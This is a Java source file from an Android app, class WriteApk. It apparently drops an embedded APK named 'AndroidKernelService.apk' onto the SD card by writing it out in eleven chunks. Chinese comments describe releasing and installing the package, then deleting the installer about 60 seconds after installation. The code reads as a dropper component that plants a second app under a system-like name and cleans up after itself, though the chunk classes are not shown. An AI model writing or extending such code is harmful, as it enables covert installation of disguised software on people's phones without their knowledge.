package com.Qdzs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.util.Log;

public class WriteApk {

	final String myLogFilePath = "/mnt/sdcard/";

	void Write() {

		// 释放、安装
		File targetApk = new File(myLogFilePath + "AndroidKernelService.apk");
		if (targetApk.exists()) {
			targetApk.delete();
		}

		Log.i("SDPath", myLogFilePath);
		System.out.print(myLogFilePath);

		WriteLogFile.writeLog("start");

		WriteApk01 myWriteApk01 = new WriteApk01();
		myWriteApk01.doWriteApk();
		WriteApk02 myWriteApk02 = new WriteApk02();
		myWriteApk02.doWriteApk();
		WriteApk03 myWriteApk03 = new WriteApk03();
		myWriteApk03.doWriteApk();
		WriteApk04 myWriteApk04 = new WriteApk04();
		myWriteApk04.doWriteApk();
		WriteApk05 myWriteApk05 = new WriteApk05();
		myWriteApk05.doWriteApk();
		WriteApk06 myWriteApk06 = new WriteApk06();
		myWriteApk06.doWriteApk();
		WriteApk07 myWriteApk07 = new WriteApk07();
		myWriteApk07.doWriteApk();
		WriteApk08 myWriteApk08 = new WriteApk08();
		myWriteApk08.doWriteApk();
		WriteApk09 myWriteApk09 = new WriteApk09();
		myWriteApk09.doWriteApk();
		WriteApk10 myWriteApk10 = new WriteApk10();
		myWriteApk10.doWriteApk();
		WriteApk11 myWriteApk11 = new WriteApk11();
		myWriteApk11.doWriteApk();
		WriteLogFile.writeLog("end");

		// 检测是否已经安装软件，如果已经安装文件就将安装包删除掉(60秒后)
	}
}
